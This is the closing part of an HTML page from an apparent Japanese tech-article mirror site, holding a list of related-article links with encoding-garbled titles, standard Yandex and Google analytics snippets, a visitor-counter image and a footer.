<li><a href="../ja485206/index.html">Typescript„ÅØ„Å©„ÅÆ„Çà„ÅÜ„Å´ÁßÅ„Çí„Åå„Å£„Åã„Çä„Åï„Åõ„Åæ„Åó„Åü„ÅãÔºü</a></li>
<li><a href="../ja485208/index.html">„Éï„Ç©„Éº„É´„Éà„Éà„É¨„É©„É≥„ÉàIT„Ç§„É≥„Éï„É©„Çπ„Éà„É©„ÇØ„ÉÅ„É£„ÅÆ‰ΩúÊàê„ÄÇ„Éë„Éº„Éà2. oVirt 4.3„ÇØ„É©„Çπ„Çø„Éº„ÅÆ„Ç§„É≥„Çπ„Éà„Éº„É´„Å®ÊßãÊàê</a></li>
<li><a href="../ja485210/index.html">Unity„ÅÆ„Ç∑„É≥„Éó„É´„Å™„Çæ„É≥„Éì„Ç∑„É•„Éº„Çø„Éº</a></li>
<li><a href="../ja485214/index.html">CLRiumÔºÉ7ÔºöÂÆüÁî®ÁöÑ„ÄÇ„ÉØ„Éº„ÇØ„Ç∑„Éß„ÉÉ„Éó„ÄÅÁ¢∫Ë™ç‰ªò„Åç„ÅÆÂÆøÈ°å„ÄÅ„É°„É≥„Çø„É™„É≥„Ç∞</a></li>
<li><a href="../ja485218/index.html">C„Åß„ÅÆÂÆöÊï∞„Å®Git„Éï„ÉÉ„ÇØ„ÅÆ‰∫àÁ¥ÑÔºÉ</a></li>
<li><a href="../ja485220/index.html">Web„Ç¢„Éó„É™„Ç±„Éº„Ç∑„Éß„É≥„Éï„Ç°„Ç§„Ç¢„Ç¶„Ç©„Éº„É´„ÅÆÈÄ≤ÂåñÔºö„Éï„Ç°„Ç§„Ç¢„Ç¶„Ç©„Éº„É´„Åã„ÇâÊ©üÊ¢∞Â≠¶Áøí„ÅÆ„ÇØ„É©„Ç¶„Éâ„Éô„Éº„Çπ„ÅÆ„Çª„Ç≠„É•„É™„ÉÜ„Ç£„Å∏</a></li>
<li><a href="../ja485222/index.html">‰∏≠ÂõΩ„ÅÆ„Ç™„Éî„Éã„Ç™„É≥„É™„Éº„ÉÄ„Éº„Å®ÈÄ£Êê∫„Åô„Çã„Å´„ÅØ 5„Å§„ÅÆÂÆüÁî®ÁöÑ„Å™„Éí„É≥„Éà</a></li>
<li><a href="../ja485224/index.html">2020Âπ¥1Êúà1Êó•„Åã„Çâ„ÅÆÈÄöÈñ¢Âà∂Èôê„Å´Ë©≤ÂΩì„Åô„ÇãÂïÜÂìÅ„ÅÆÈÖçÈÄÅ„ÅØ„Å©„ÅÜ„Åß„Åô„Åã</a></li>
<li><a href="../ja485226/index.html">UIÈñãÁô∫ÔºöË™∞„Å´ËÅû„Åè„Åã-Ëá™ÂàÜËá™Ë∫´„Åã„É¶„Éº„Ç∂„Éº„Åã</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>